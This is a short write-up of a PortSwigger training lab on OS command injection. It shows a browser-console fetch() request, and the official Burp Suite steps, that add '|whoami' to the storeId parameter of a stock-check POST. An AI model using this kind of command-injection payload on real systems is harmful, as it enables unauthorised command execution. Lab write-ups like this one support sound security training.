# Lab: OS command injection, simple case

**Category:** OS command injection 

**Difficulty:** Apprentice

**Status:** 
 
## Lab Description

## Solution
At first i thought of solving it in the URL bar BUT in this lab the check stock button is a `POST` request sending directly inside the body not into the URL. URL bar only receives `GET` requests.

In Console, we can type this command (after "allow pasting")
```javascript
fetch('/product/stock', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'productId=1&storeId=1|whoami'
})
.then(res => res.text())
.then(data => console.log(data));
```
And the lab solved.

Also the solution of PortSwigger itself using Burp Suite:

Use Burp Suite to intercept and modify a request that checks the stock level. Modify the `storeID` parameter, giving it the value `1|whoami`. Observe that the response contains the name of the current user.
